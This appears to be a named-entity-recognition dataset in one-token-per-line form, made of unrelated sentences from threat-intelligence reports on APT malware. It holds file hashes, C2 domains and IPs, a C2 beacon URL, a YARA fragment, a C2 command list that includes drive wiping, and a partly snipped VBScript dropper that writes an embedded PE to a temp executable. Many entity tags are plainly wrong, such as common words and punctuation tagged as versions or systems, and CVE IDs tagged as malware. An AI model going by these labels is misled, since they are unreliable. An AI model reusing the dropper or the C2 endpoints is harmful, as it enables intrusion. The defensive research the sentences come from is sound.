SPLM/CHOPSTICK	B-Malware
activity	O
leads	O
into	O
several	O
small	O
surprises	O
that	O
take	O
us	O
into	O
2018	O
,	O
to	O
be	O
discussed	O
in	O
further	O
detail	O
at	O
SAS	O
2018	O
.	O

Atomic	O
indicators	O
are	O
generally	O
weak	O
indicators	O
given	O
their	O
ease	O
of	O
modification	O
within	O
the	O
attack	O
scenario	O
and	O
should	O
only	O
be	O
used	O
as	O
preliminary	B-Version
indicators	O
while	O
more	O
robust	O
methods	O
are	O
instituted	O
.	O

This	O
gave	O
analysts	O
two	O
more	O
suspicious	O
servers	O
to	O
study	O
,	O
and	O
added	O
considerable	O
data	O
analysis	O
.	O

'	O
ClearSky	O
'	O
www.clearskysec.com	B-Indicator

Then	O
it	O
must	O
connect	O
metasploit	O
of	O
Linux	O
.	O

The	O
register	O
will	O
point	O
to	O
the	O
encoded	O
string	O
is	O
the	O
destination	O
buffer	O
address	O
for	O
the	O
decoded	O
string	O
.	O

Once	O
dumped	O
,	O
the	O
confi	O
dential	O
information	O
gets	O
uploaded	O
to	O
the	O
command	O
and	O
control	O
server	O
at	O
a	O
later	O
time	O
.	O

Below	O
screen	O
shot	O
shows	O
the	O
code	O
that	O
generates	O
the	O
password	O
.	O

System	O
owners	O
are	O
also	O
advised	O
to	O
run	O
the	O
Yara	O
signature	O
on	O
any	O
system	O
that	O
is	O
suspected	O
to	O
have	O
been	O
targeted	O
by	O
RIS	O
actors	O
.	O

Both	O
of	O
these	O
IDS	O
signatures	O
can	O
be	O
optimized	O
further	O
to	O
factor	O
depth	O
and	O
offset	O
.	O

Compared	O
to	O
Patchwork	O
,	O
whose	O
Trojanized	O
documents	O
exploit	O
at	O
least	O
five	O
security	O
flaws	O
,	B-System
Confucius	O
'	O
backdoors	O
are	O
delivered	O
through	O
Office	O
files	O
exploiting	O
memory	O
corruption	O
vulnerabilities	O
CVE-2015-1641	B-Malware
and	O
CVE-2017-11882	B-Malware
.	O

In	O
order	O
to	O
prevent	B-Version
detonation	O
on	O
hosts	O
other	O
than	O
that	O
of	O
the	O
intended	O
victim	O
,	O
the	O
malware	O
author	O
has	O
purposely	O
mangled	O
the	O
first	O
two	O
bytes	O
of	O
the	O
RAT	B-Malware
Implant	O
.	O

It	O
is	O
possible	O
that	O
they	O
are	O
hacked	O
boxes	O
,	O
and	O
as	O
such	O
not	O
give	O
much	O
valid	O
information	O
.	O

McAfee	B-Organization
Network	B-System
Security	O
Platform	O
McAfee	B-Organization
Network	B-System
Security	O
Platform	O
versions	O
with	O
Artemis	O
enabled	O
(	O
6.0.x	B-Version
)	O
provide	O
coverage	O
for	O
this	O
malware	O
.	O

As	O
such	O
,	O
we	O
counted	O
the	O
unique	O
IP	O
addresses	O
that	O
connected	O
to	O
the	O
sinkhole	O
on	O
each	O
day	O
.	O

Command	O
&	O
Control	O
Servers	O

C	O
&	O
C	O
IP	O
address	O

A	O
snippet	O
of	O
the	O
malicious	O
macro	O
's	O
code	O
,	O
marked	O
with	O
colored	O
boxes	O
to	O
show	O
the	O
different	O
functions	O

2016	O
.	O

Each	O
value	O
under	O
this	O
key	O
represents	O
a	O
separate	O
Svchost	O
group	O
and	O
appears	O
as	O
a	O
separate	O
instance	O
when	O
you	O
are	O
viewing	O
active	O
processes	O
.	O

IOPCSyncIO	O

Please	O
wait	O
..	O
<	O
script	O
language='javascript	O
'	O
>	O
document.location=	O
'	O
'	O
;	O
<	O
/script	O
>	O
<	O
HTML	O
>	O
<	O
script	O
language=vbs	O
>	O
Set	O
o=CreateObject	O
(	O
'	O
Scripting.FileSystemObject	O
'	O
)	O
Set	O
s=CreateObject	O
(	O
'	O
WScript.Shell	O
'	O
)	O
p=o.GetSpecialFolder	O
(	O
2	O
)	O
&	O
'	O
\1.exe	O
'	B-Version
t=split	O
(	O
'	O
4D,5A,90,0,3,0,0,0,4,0,0,0	O
,	O
FF	O
,	O
FF,0,0	O
,	O
B8,0,0,0,0,0,0,0,40,0,0,0,0,0,0,0	O
,	O
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,80,0,0,0	O
,	O
E,1F	O
,	O
BA	O
,	O
E,0	O
,	O
B4	O
,	O
9	O
,	O
CD,21	O
,	O
B8,1,4C	O
,	O
CD,21,54,68,69,73,20,70,72,6F,67,72,61,6D,20,63,61,6E,6E,6F,74,2	O
0,62,65,20,72,75,6E,20,69,6E,20,44,4F,53,20,6D,6F,64,65,2E	O
,	O
D	O
,	O
D	O
,	O
A,24,0,0,0,0,0,0	O
,	O
0,50,45,0,0,4C,1,3,0,44,20	O
,	O
B6,51,0,0,0,0,0,0,0,0	O
,	O
E0,0,2,1	O
,	O
B,1,8,0,0	O
,	O
CC,1,0,0,8,0	O
,0,0,0,0,0,3E	O
,	O
EA,1,0,0,20,0,0,0,0,0,0,0,0,40,0,0,20,0	O
,	O
<	O
SNIP	O
>	O
<	O
SNIP	O
>	O
<	O
SNIP	O
>	O
<	O
SNIP	O
>	O
<	O
SNIP	O
>	O
<	O
SNIP	O
>	O
<	O
SNIP	O
>	O
<	O
SNIP	O
>	O

The	O
email	O
address	O
used	O
to	O
register	O
this	O
domain	O
was	O
also	O
referenced	O
in	O
a	O
Chinese	O
developer	O
forum	O
,	O
but	O
nothing	O
else	O
interesting	O
was	O
discovered	O
about	O
it	O
.	O

All	O
these	O
activities	O
are	O
performed	O
via	O
the	O
'	O
mail.bg	O
'	O
web-interface	O
with	O
the	O
use	O
of	O
the	O
system	O
Wininet	O
API	O
functions	O
.	O

File	O
Name	O
:	O
netsat.exe	B-Malware
File	O
Size	O
:	O
43520	O
bytes	O
MD5	O
:	O
eb8399483b55f416e48a320d68597d72	B-Indicator
SHA1	O
:	O
8a7183b7ceb30517460b6ab614551ca38e915309	B-Indicator
PE	O
Time	O
:	O
0x5154F7F2	B-Version
[	O
Fri	O
Mar	O
29	O
02:09:54	O
2013	O
UTC	O
]	O
Sections	O
(	O
4	O
)	O
:	O
Name	O
Entropy	O
MD5	O
.text	O
6.37	O
df1790813aca1265bc475f3891957512	B-Indicator
.rdata	O
5.19	O
a598dca4a8fe8ee17941fa60be746d31	B-Indicator
.data	O
0.29	O
b3d1c1a0b1054a082c841ebd1354755f	B-Indicator
.rsrc	O
3.34	O
d4b9539426ff130b80e11efec7465acd	B-Indicator
File	O
Name	O
:	O
netui3.dll	B-Malware
File	O
Size	O
:	O
39424	O
bytes	O
MD5	O
:	O
68aed7b1f171b928913780d5b21f7617	B-Indicator
SHA1	O
:	O
44e711e95311b81d597a7800d96482b873cb8235	B-Indicator
PE	O
Time	O
:	O
0x5152AE99	O
[	O
Wed	O
Mar	O
27	O
08:32:25	O
2013	O
UTC	O
]	O
Sections	O
(	O
3	O
)	O
:	O
Name	O
Entropy	O
MD5	O
.text	O
6.37	O
b2a939d2ad678201560285287e7dca1d	B-Indicator
.rdata	O
5.32	O
2cd54a2d2ada8650c9bd9eae69aef3ca	B-Indicator
.data	O
0.58	O
70a79ca0958afad5b7742641b2cff9ea	B-Indicator
File	O
Name	O
:	O
winmgt.dll	B-Malware
File	O
Size	O
:	O
37888	O
bytes	O
MD5	O
:	O
54e4a15a68cfbb2314d0aaad455fbfce	B-Indicator
SHA1	O
:	O
49531b098049ae52264ae9b398c2cf59ff5379bc	B-Indicator
PE	O
Time	O
:	O
0x50CAEAE4	O
[	O
Fri	O
Dec	O
14	O
09:01:24	O
2012	O
UTC	O
]	O
Sections	O
(	O
3	O
)	O
:	O
Name	O
Entropy	O
MD5	O
.text	O
6.31	O
6a0f9499f4ca8e0b2e4f09b9126806e6	B-Indicator
.rdata	O
5.23	O
e49920b9ebad63f0d95bad505ea8fdf7	B-Indicator
.data	O
0.59	O
a583b2c8490a7f0fcaee2f4776e445d8	B-Indicator

The	O
third	O
version	O
we	O
found	O
(	O
5.1.2	B-Version
rc1	O
)	O
reverts	O
to	O
a	O
DLL	O
file	O
type	O
but	O
retains	O
the	O
C	O
&	O
C	O
server	O
.	O

When	O
we	O
analyzed	O
ANEL	B-Malware
5.1.1	B-Version
rc	O
,	O
encrypted	O
ANEL	B-Malware
5.1.2	O
rc1	O
was	O
downloaded	O
and	O
executed	O
.	O

(	O
November	O
13	O
,	O
2012	O
)	O
.	O

Meanwhile	O
,	O
we	O
found	O
the	O
following	O
binary	O
leading	O
attack	O
files	O
(	O
hereinafter	O
referred	O
to	O
as	O
Sample	O
A	O
)	O
were	O
used	O
in	O
similar	O
attacks	O
before	O
:	O

Urgent	O
message.doc	O

SHA-1	O
c388b693d10e2b84af52ab2c29eb9328e47c3c16	B-Indicator
8ad0a56e3db1e2cd730031bdcae2dbba3f7aba9c	B-Indicator
200.122.181.63	B-Indicator
Domains	O
thlsystems.for rst.cz	B-Indicator
mafra.go.kr.jeojang.ga	B-Indicator
Previous	O
Article	O
(	O
https://securingtomorrow.mcafee.com/consumer/family-safety/2018-resolution-lose-weight-tech-safety-guilt/	B-Indicator
)	O
Next	O
Article	O
(	O
https://securingtomorrow.mcafee.com/consumer/mcafee-ces-solutions-partnerships/	B-Indicator
)	O
Categories	O
:	O
McAfee	O
Labs	O
(	O
https://securingtomorrow.mcafee.com/category/mcafee-labs/	B-Indicator
)	O
Tags	O
:	O
cybersecurity	O
(	O
https://securingtomorrow.mcafee.com/tag/cybersecurity/	B-Indicator
)	O
,	O
endpoint	O
protection	O
(	O
https://securingtomorrow.mcafee.com/tag/endpoint-protection/	O
)	O
,	O
malware	O
(	O
https://securingtomorrow.mcafee.com/tag/malware/	B-Indicator
)	O

With	O
the	O
help	O
of	O
the	O
researcher	O
that	O
goes	O
online	O
with	O
the	O
Twitter	O
handle	O
Drunk	O
Binary	O
(	O
@	O
DrunkBinary	O
)	O
we	O
obtained	O
a	O
collection	O
of	O
samples	O
to	O
compare	O
with	O
the	O
one	O
we	O
were	O
in	O
possession	O
to	O
discover	O
if	O
we	O
were	O
in	O
presence	B-Version
of	O
a	O
new	O
variant	O
of	O
the	O
infamous	O
APT28	B-Malware
backdoor	O
tracked	O
as	O
X-Agent	B-Malware
.	O

Figure	O
1	O
.	O

תויאבצ	O
תוינכות	O
תוינכות	O
כ'בש	O
Intelligence	O
meeting	O
protocol	O
passwords	O
passwords	O
the	O
passwords	O
the	O
passwords	O
the	O
passwords	O
Database	O
document	O
SITA	O
(	O
www.sita.aero	O
)	O
military	O
defense	O
or	O
security	O
related	O
the	O
emails	O
intelligence	O
military	O
plans	O
plans	O
Shabak	O
(	O
Israel	O
Security	O
Agency	O
)	O

The	O
PCC_CMD	B-Indicator
:	O
:ProcessPacket	B-Indicator
function	O
works	O
as	O
a	O
stub	O
function	O
that	O
merely	O
passes	O
the	O
packet	O
's	O
payload	O
data	O
(	O
pkt	O
)	O
data	O
to	O
PCC_CMD	O
:	O
:ProcessPacketEx	O
while	O
ignoring	O

dequeue	O
:	O
]	O

Msfte.dll	B-Malware
is	O
the	O
final	O
backdoor	O
program	O
whose	O
export	O
is	O
disguised	O
as	O
zlib	O
.	O

Their	O
bootstrap	O
logic	O
is	O
also	O
hidden	O
in	O
plain	O
sight	O
,	O
such	O
that	O
it	O
might	O
be	O
easy	O
to	O
miss	O
.	O

rule	O
apt_win32_dll_rat_1a53b0cp32e46g0qio7	O
in	O
the	O
beacon	O
word	O
ptr	O
[	O
ebp+eax*2+var_5C	O
]	O
,	O
14h	O
$	O
=	O
{	O
66	O
[	O
4-7	O
]	O
14	O
40	O
83	O
f8	O
14	O
7c	O
?	O
?	O
}	O

일부	O
변형은	O
Themida	B-Malware
등의	O
패커로	O
패킹했다	O
.	O

Completely	O
decrypted	O
and	O
de-obfuscated	O
network	O
traffic	O
from	O
this	O
malware	O
will	O
look	O
like	O
the	O
following	O
(	O
replace	O
COMPUTER_NAME	O
with	O
actual	O
name	O
of	O
computer	O
,	O
host	O
header	O
remove	O
brackets	O
)	O
:	O
In	O
the	O
above	O
POST	O
request	O
,	O
the	O
string	O
'	O
1a53b0cp32e46g0qio9	O
'	O
is	O
staticly	O
embedded	O
within	O
the	O
binary	O
,	O
not	O
changing	O
between	O
C2	O
beacons	O
,	O
and	O
the	O
negative	O
value	O
'	O
-1289335108	O
'	O
refers	O
to	O
the	O
signed	O
integer	O
representation	O
of	O
the	O
Victim	O
's	O
Volume	O
Serial	O
Number	O
without	O
the	O
dash	O
(	O
'	O
-	O
'	O
)	O
.	O

For	O
further	O
details	O
on	O
the	O
configuration	O
information	O
,	O
please	O
refer	O
to	O
Appendix	O
B	O
.	O

Customers	O
of	O
McAfee	B-Organization
ePolicy	B-System
Orchastrator	O
,	O
integrated	O
with	O
Digital	O
DNA	O
,	O
can	O
detect	O
emerging	O
advanced	O
persistent	O
threats	O
.	O

Serial	O
Number	O
:	O
3F	B-Version
FC	O
EB	O
A8	B-Version
3F	B-Version
E0	B-Version
0F	B-Version
EF	O
97	O
F6	O
3C	B-Version
D9	B-Version
2E	B-Version
77	O
EB	O
B9	O
Why	O
the	O
attackers	O
chose	O
to	O
use	O
this	O
expired	O
certificate	O
to	O
sign	O
their	O
malware	O
samples	O
is	O
unknown	O
.	O

So	O
in	O
order	O
to	O
develop	O
a	O
tracker	O
that	O
impersonates	O
a	O
DarkComet	B-Malware
bot	O
so	O
as	O
to	O
snoop	O
on	O
DDoS	O
attacks	O
,	O
we	O
need	O
to	O
reverse	O
the	O
malware	O
's	O
crypto	O
system	O
and	O
write	O
decryption	O
and	O
encryption	O
routines	O
in	O
Python	O
.	O

In	O
a	O
change	O
from	O
previous	B-Version
compilations	O
,	O
the	O
module	O
was	O
structured	O
and	O
used	O
to	O
inject	O
remote	O
shell	O
,	O
keylogger	B-Malware
,	O
and	O
filesystem	O
add-ons	O
into	O
processes	O
running	O
on	O
victim	O
systems	O
and	O
maintaining	O
functionality	O
that	O
was	O
originally	O
present	O
within	O
the	O
main	O
module	O
.	O

The	O
Win32/Filecoder.AESNI.C	B-Indicator
ransomware	O
had	O
a	O
spreading	O
mechanism	O
that	O
allowed	O
it	O
to	O
perform	O
lateral	O
movement	O
automatically	O
,	O
inside	O
a	O
compromised	O
company	O
LAN	O
.	O

Web	B-Malware
Shell	I-Malware
Payload	O
MD5	O
Hash	O

Once	O
the	O
malware	O
is	O
executed	O
it	O
attempts	O
to	O
spread	O
using	O
the	O
infamous	O
EternalBlue	B-Malware
exploit	O
,	O
leveraging	O
the	O
DoublePulsar	O
kernel-mode	O
backdoor	O
.	O

First	O
of	O
all	O
,	O
Powershell	O
will	O
fuzzy	O
match	O
incoming	O
parameter	O
names	O
,	O
and	O
it	O
is	O
case-insensitive	O
.	O

To	O
date	O
,	O
we	O
have	O
observed	O
more	O
than	O
two	O
dozen	O
victims	O
for	O
these	O
attacks	O
.	O

They	O
do	O
not	O
check	O
files	O
directly	O
either	O
,	O
instead	O
,	O
checking	O
for	O
the	O
presence	O
of	O
a	O
list	O
of	O
folder	O
names	O
:	O
In	O
this	O
case	O
,	O
rather	O
than	O
determining	O
what	O
security	O
software	O
is	O
present	O
,	O
this	O
check	O
would	O
mainly	O
be	O
useful	O
in	O
assisting	O
the	O
attacker	O
with	O
identifying	O
the	O
victim	O
's	O
operating	O
system	O
.	O

theme0.xml	O
is	O
extracted	O
to	O
/tmp/system/word/theme/syslogd	O
before	O
it	O
's	O
executed	O
.	O

Email	O
Address	O
*	O
Country	O
*	O
--	O
Please	O
Select-In	O
this	O
new	O
,	O
aggressive	O
campaign	O
we	O
see	O
a	O
return	O
of	O
the	O
Bankshot	O
implant	O
,	O
which	O
last	O
appeared	O
in	O
2017	O
.	O

It	O
is	O
likely	O
that	O
the	O
user	O
is	O
advised	O
that	O
the	O
certificate	O
must	O
be	O
installed	O
to	O
allow	O
enrollment	O
.	O

C2	O
Command	O
Purpose	O
reboot	O
shutdown	O
clean	O
screenshot	O
upload	O
excel	O
outlook	B-System
risk	O
Reboot	O
the	O
system	O
using	O
shutdown	O
command	O
Shut	O
down	O
the	O
system	O
using	O
shutdown	O
command	O
Wipe	O
the	O
Drives	O
,	O
C	O
:	O
\	O
,	O
D	O
:	O
\	O
,	O
E	O
:	O
\	O
,	O
F	O
:	O
\	O
Take	O
a	O
screenshot	O
of	O
the	O
System	O
Encrypt	O
and	O
upload	O
the	O
information	O
from	O
the	O
system	O
Leverage	O
Excel.Application	O
COM	O
object	O
for	O
code	O
execution	O
Leverage	O
Outlook.Application	O
COM	O
object	O
for	O
code	O
execution	O
Leverage	O
DCOM	O
object	O
for	O
code	O
execution	O
This	O
activity	O
shows	O
us	O
that	O
TEMP.Zagros	O
stays	O
up-to-date	O
with	O
the	O
latest	O
code	O
execution	O
and	O
persistence	O
mechanism	O
techniques	O
,	O
and	O
that	O
they	O
can	O
quickly	O
leverage	O
these	O
techniques	O
to	O
update	O
their	O
malware	O
.	O

http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp_ixeshe.pdf	O
Trend	O
Micro	O
Incorporated	O
.	O

Tencent	B-Malware
QQ	I-Malware
Memory	O
Reading	O

Threat	O
Type	O

cd675977bf235eac49db60f6572be0d4051b9c07	B-Indicator

World	O
Anti-Doping	O
Agency	O
.	O

They	O
have	O
affected	O
organizations	O
all	O
over	O
the	O
world	O
.	O

It	O
may	O
have	O
been	O
implemented	O
for	O
the	O
purpose	O
of	O
wasting	O
time	O
.	O

?	O
?	O

The	O
syntax	O
to	O
define	O
scheduled	O
tasks	O
is	O
similar	O
to	O
the	O
one	O
used	O
by	O
the	O
cron	O
Unix	O
command	O
.	O

This	O
attack	O
used	O
malware	O
with	O
a	O
much	O
higher	O
level	O
of	O
sophistication	O
than	O
is	O
necessary	O
to	O
launch	O
a	O
trivial	O
distributed	O
denial	O
of	O
service	O
(	O
DDoS	O
)	O
attack	O
.	O

Of	O
particular	O
interest	O
is	O
the	O
encrypted	O
NETDATA	O
resource	O
,	O
which	O
holds	O
the	O
C	O
&	O
C	O
hostname	O
and	O
port	O
.	O

Questions	O
have	O
been	O
raised	O
since	O
Le	O
Monde	O
published	O
an	O
article	O
on	O
Babar	B-Malware
in	O
2014	O
and	O
were	O
recently	O
fuelled	O
by	O
a	O
leaked	O
government	O
presentation	O
found	O
among	O
a	O
stash	O
of	O
documents	O
published	O
in	O
January	O
by	O
Spiegel.The	O
leaked	O
document	O
was	O
authored	O
by	O
the	O
Communications	O
Security	O
Establishment	O
Canada	O
(	O
CSEC	O
)	O
and	O
reports	O
about	O
a	O
potential	O
nation	O
state	O
attack	O
involving	O
malware	O
named	O
Babar	B-Malware
.	O

Moreover	O
,	O
older	O
versions	O
of	O
the	O
BE	O
destructive	O
module	O
have	O
even	O
longer	O
lists	O
.	O

1-The	O
name	O
30.apk	B-Malware
is	O
an	O
abbreviated	O
variant	O
of	O
Поправки-Д	O
30	B-Version
which	O
translates	O
to	O
Correction-D30	O
.	O

Kelly	O
Bissell	O
Joshua	O
Ray	O
Uwe	O
Kissman	O
Ryan	O
LaSalle	O
Gareth	O
Russell	O

We	O
believe	O
this	O
is	O
mainly	O
used	O
to	O
intercept	O
credentials	O
from	O
other	O
browsers	O
,	O
specifically	O
Google	O
Chrome	O
:	O
The	O
backdoor	O
tries	O
to	O
contact	O
the	O
following	O
domains	O
until	O
it	O
gets	O
a	O
response	O
from	O
an	O
active	O
one	O
:	O
silence.phdns01.com	B-Indicator
cpnet.phmail.us	B-Indicator
imlang.phmail.org	B-Indicator
The	O
Indian	O
backdoor	O
tries	O
to	O
contact	O
the	O
following	O
domains	O
instead	O
:	O
cresy.zyns.com	B-Indicator
preter.epac.to	B-Indicator
backto.ddns.name	B-Indicator
In	O
the	O
first	O
set	O
of	O
domains	O
they	O
are	O
either	O
registered	O
with	O
Whois	O
proxy	O
services	O
or	O
with	O
fake	O
identities	O
.	O

Exploit	O
Document	O
MD5	O
:	O

compname=	O
<	O
COMPUTERNAME	O
>	O
and	O
http[:]//199.91.173[.]45/is_array.php?compname=	B-Indicator
<	O
COMPUTERNAME	O
>	O
.	O

The	O
DLL	O
when	O
loaded	O
in	O
the	O
context	O
of	O
an	O
application	O
seeks	O
to	O
invade	O
a	O
maximum	O
of	O
two	O
more	O
victim	O
processes	O
.	O

Then	O
,	O
they	O
would	O
compromise	O
the	O
legitimate	O
company	O
software	O
distribution	O
sites	O
and	O
replace	O
the	O
legitimate	O
installers	O
with	O
the	O
Crouching	B-Malware
Yeti	I-Malware
trojanized	O
versions	O
.	O

In	O
order	O
to	O
firewall	O
tunnels	O
from	O
each	O
other	O
over	O
the	O
backbone	O
of	O
the	O
server	O
variant	O
's	O
command	O
channel	O
,	O
each	O
tunnel	O
is	O
assigned	O
a	O
specific	O
channel	O
identifier	O
.	O

Fancy	O
Bears	O
'	O
HT	O
(	O
fancybears	O
)	O
.	O

Decoy	O
Document	O
Last	O
Modified	O
:	O

168.235.86.156	B-Indicator
United	O
States	O
Macon	O
Ramnode	O
Llc	O

The	O
variant	O
{	O
92BA1818-0119-4F79-874E-E3BF79C355B8	B-Version
}	O
.dll	O
checks	O
whether	O
rastlsc.exe	O

Email	O
Subscription	O
Your	O
email	O
here	O

Although	O
a	O
regional	O
actor	O
,	O
the	O
group	O
has	O
followed	O
two	O
trends	O
seen	O
globally	O
among	O
targeted	O
attack	O
groups	O
.	O

)	O
use_proxy	O
=	O
0	O
;	O
buffer	O
=	O
3	O
;	O
>	O
hInternetOpen	O
=	O
InternetOpenA	O
(	O
'	O
Mozilla	O
/4.0	O
'	O
,	O
0	O
,	O
0	O
,	O
0	O
,	O
0	O
)	O
;	O
(	O
use_proxy	O
)	O
success_setoption	O
=	O
InternetSetOptionA	O
(	O
>	O
hInternetOpen	O
,	O
INTERNET_OPTION_PROXY	O
,	O
&	O
buffer	O
,	O
12	O
)	O
;	O
!	O

Infostealer.Rodagose	O
(	O
https://www.symantec.com/security_response/writeup.jsp?docid=2014-120814-2005-99	B-Indicator
)	O
Trojan.Rodagose!g1	O
(	O
https://www.symantec.com/security_response/writeup.jsp?docid=2014-121010-5835-99	B-Indicator
)	O
Trojan.Rodagose!g2	O
(	O
https://www.symantec.com/security_response/writeup.jsp?docid=2017-102416-2407-99	B-Indicator
)	O
Trojan.MDropper	O
(	O
https://www.symantec.com/security_response/writeup.jsp?docid=2005-031911-0600-99	B-Indicator
)	O

improving	O
Minerva	O
-Do	O
n't	O
chase	O
,	O
Prevent	O
!	O

In	O
this	O
paper	O
we	O
take	O
an	O
in-depth	O
look	O
of	O
the	O
malware	O
by	O
examining	O
the	O
attack	O
vectors	O
used	O
,	O
and	O
later	O
discuss	O
whether	O
the	O
claims	O
in	O
the	O
media	O
are	O
warranted	O
.	O

·	O
cache.txt	O
·	O
cache.txt.cfg	O
The	O
second	O
command	O
contains	O
commands	O
for	O
the	O
Command	O
Prompt	O
(	O
cmd.exe	O
)	O
.	O

This	O
allows	O
the	O
attackers	O
to	O
know	O
which	O
programs	O
are	O
running	O
on	O
the	O
system	O
or	O
if	O
any	O
analysis	O
tools	O
are	O
used	O
to	O
inspect	O
the	O
malware	O
.	O

Pokemon-PC.zip	O
(	O
40303cd6abe7004659ca3447767e4eb7	B-Indicator
)	O
contained	O
Pokemon-PC.exe	O
(	O
e45119a72677ed15ee0f04ef936a9803	B-Indicator
)	O
,	O
which	O
at	O
run	O
time	O
drops	O
monitar.exe	O
(	O
d3e0b129bad263e6c0dcb1a9da55978b	B-Indicator
)	O
:	O
The	O
attackers	O
also	O
distributed	O
a	O
malicious	O
app	O
for	O
Android	O
devices	O
–	O
pokemon.apk	O
(	O
3137448e0cb7ad83c433a27b6dbfb090	B-Indicator
)	O
.	O

Determining	O
the	O
activity	O
of	O
targeted	O
threat	O
actors	O
is	O
difficult	O
.	O

It	O
can	O
be	O
assumed	O
with	O
some	O
degree	O
of	O
certainty	O
that	O
the	O
group	O
operates	O
in	O
the	O
interests	O
of	O
or	O
takes	O
orders	O
from	O
customers	O
that	O
are	O
external	O
to	O
it	O
,	O
performing	O
initial	O
data	O
collection	O
,	O
the	O
theft	O
of	O
authentication	O
data	O
and	O
gaining	O
persistence	O
on	O
resources	O
that	O
are	O
suitable	O
for	O
the	O
attack	O
's	O
further	O
development	O
.	O

First	O
Seen	O
:	O

C	O
:	O
Program	O
FilesCommon	O
FilesSystemOle	O
DB	O
to	O
a	O
file	O
named	O
according	O
to	O
the	O
following	O
format	O
:	O
'	O
<	O
system	O
time	O
>	O
_	O
<	O
account	O
at	O
Bulgarian	O
email	O
server	O
>	O
.txt	O
'	O
,	O
for	O
example	O
,	O
'	O
08191757_beautifl@mail.bg.txt	O
'	O
.	O

The	O
second	O
component	O
,	O
Deep	O
Discovery	O
Advisor	O
,	O
provides	O
sandbox	O
analysis	O
of	O
known	O
and	O
unknown	O
threats	O
that	O
augments	O
the	O
capabilities	O
of	O
existing	O
products	O
like	O
endpoint	O
solution	O
and	O
email/web	O
gateways	O
.	O

Yet	O
,	O
malware	O
represents	O
only	O
the	O
tip	O
of	O
the	O
spear	O
.	O

The	O
malware	O
communicates	O
with	O
a	O
FinSpy	B-Malware
Command	O
&	O
Control	O
server	O
in	O
Ethiopia	O
,	O
which	O
was	O
first	O
identified	O
by	O
Rapid7	O
in	O
August	O
2012	O
.	O

Win.Trojan.ZxShell-11	B-Malware
Win.Trojan.ZxShell-12	B-Malware
Win.Trojan.ZxShell-13	B-Malware
Win.Trojan.ZxShell-14	B-Malware
Win.Trojan.ZxShell-15	B-Malware
Win.Trojan.ZxShell-16	B-Malware
Win.Trojan.ZxShell-17	B-Malware
Win.Trojan.ZxShell-18	B-Malware
Win.Trojan.ZxShell-19	B-Malware
Win.Trojan.ZxShell-20	B-Malware
Win.Trojan.ZxShell-21	B-Malware
Win.Trojan.ZxShell-22	B-Malware
Win.Trojan.ZxShell-23	B-Malware
Win.Trojan.ZxShell-24	B-Malware
Win.Trojan.ZxShell-25	B-Malware
Win.Trojan.ZxShell-26	B-Malware
These	O
signatures	O
are	O
available	O
within	O
the	O
ClamAV	O
database	O
.	O

While	O
actors	O
from	O
China	O
,	O
Iran	O
,	O
Russia	O
,	O
and	O
North	O
Korea	O
remain	O
the	O
most	O
active	O
cyber	O
espionage	O
threats	O
tracked	O
and	O
responded	O
to	O
by	B-System
FireEye	O
,	O
APT32	B-Malware
reflects	O
a	O
growing	O
host	O
of	O
new	O
countries	O
that	O
have	O
adopted	O
this	O
dynamic	O
capability	O
.	O

T	O
he	O
reasons	O
for	O
this	O
are	O
not	O
very	O
clear	O
:	O
typically	O
,	O
Chinese-speaking	O
actors	O
do	O
n't	O
bother	O
disguising	O
their	O
campaigns	O
.	O

This	O
behavior	O
is	O
very	O
unusual	O
for	O
a	O
document-stealing	O
component	O
and	O
we	O
do	O
not	O
see	O
it	O
in	O
other	O
malicious	O
toolkits	O
.	O

With	O
the	O
application	O
of	O
commercial	O
attack	O
platform	O
,	O
the	O
attackers	O
saved	O
the	O
cost	O
of	O
an	O
attack	O
,	O
also	O
the	O
vulnerability	O
built	O
joint	O
function	O
provided	O
by	O
relevant	O
attack	O
platform	O
make	O
the	O
attackers	O
easy	O
to	O
do	O
injection	O
.	O

Agent.RUI	O

The	O
response	O
is	O
usually	O
an	O
HTML	O
document	O
and	O
the	O
commands	O
are	O
Base64-encoded	O
strings	O
enclosed	O
in	O
<	O
div	O
>	O
/	O
<	O
/div	O
>	O

(	O
/BLOGS/THREAT-INTELLIGENCE	O
)	O

Once	O
the	O
script	O
fi	O
nishes	O
profi	O
ling	O
the	O
infected	O
device	O
,	O
it	O
starts	O
uploading	O
confi	O
dential	O
information	O
,	O
such	O
as	O
passwords	O
.	O

The	O
server	O
variant	O
utilizes	O
a	O
device	O
driver	O
in	O
order	O
to	O
hook	O
into	O
the	O
Windows	B-System
firewall	O
by	O
either	O
using	O
largely	O
undocumented	O
Windows	B-System
Firewall	O
hooking	O
techniques	O
found	O
in	O
Windows	B-System
XP	O
and	O
older	B-Version
or	O
by	O
using	O
the	O
documented	O
Windows	B-System
Filtering	O
Platform	O
found	O
in	O
Windows	B-System
Vista	O
and	O
later	O
.	O

The	O
malware	O
used	O
in	O
a	O
DUBNIUM	B-Malware
attack	O
is	O
committed	O
to	O
disguising	O
itself	O
as	O
Secure	O
Shell	O
(	O
SSH	O
)	O
tool	O
.	O

DPHK	O
is	O
a	O
pro-democracy	O
political	O
party	O
in	O
Hong	O
Kong	O
.	O

Disk	O
space	O
information	O
for	O
all	O
available	O
logical	O
drives	O
.	O

One	O
of	O
the	O
command	O
and	O
control	O
servers	O
used	O
by	O
a	O
variant	O
of	O
this	O
implant	O
is	O
aptly	O
named	O
'	O
ct.datangcun[.]com	O
'	O
.	O

It	O
uses	O
a	O
legitimate	O
Microsoft	B-Organization
binary	O
in	O
order	O
to	O
execute	O
itself	O
with	O
administrator	O
permissions	O
.	O

It	O
definitely	O
looks	O
like	O
a	O
great	O
candidate	O
for	O
the	O
decryption	O
operation	O
.	O

intelligence	O
.	O

The	O
dropped	O
file	O
was	O
analyzed	O
in	O
an	O
isolated	O
environment	O
(	O
without	O
actually	O
allowing	O
it	O
to	O
connect	O
to	O
the	O
c2	O
server	O
)	O
.	O

The	O
group	O
is	O
using	O
new	O
types	O
of	O
lure	O
documents	O
in	O
its	O
spear-phishing	O
campaigns	O
and	O
its	O
malware	O
has	O
expanded	O
to	O
use	O
new	O
types	O
of	O
plugins	O
.	O

We	O
have	O
also	O
to	O
a	O
lesser	O
extent	O
seen	O
IP	O
addresses	O
in	O
use	O
belonging	O
to	O
another	O
Paltel	O
division	O
:	O

From	O
the	O
recent	O
sendspace.servermsys.com/downloader.hta	O
:	O
After	O
execution	O
and	O
escaping	O
a	O
couple	O
of	O
variables	O
,	O
the	O
.hta	O
uses	O
ancient	O
Adodb.stream	O
components	O
in	O
order	O
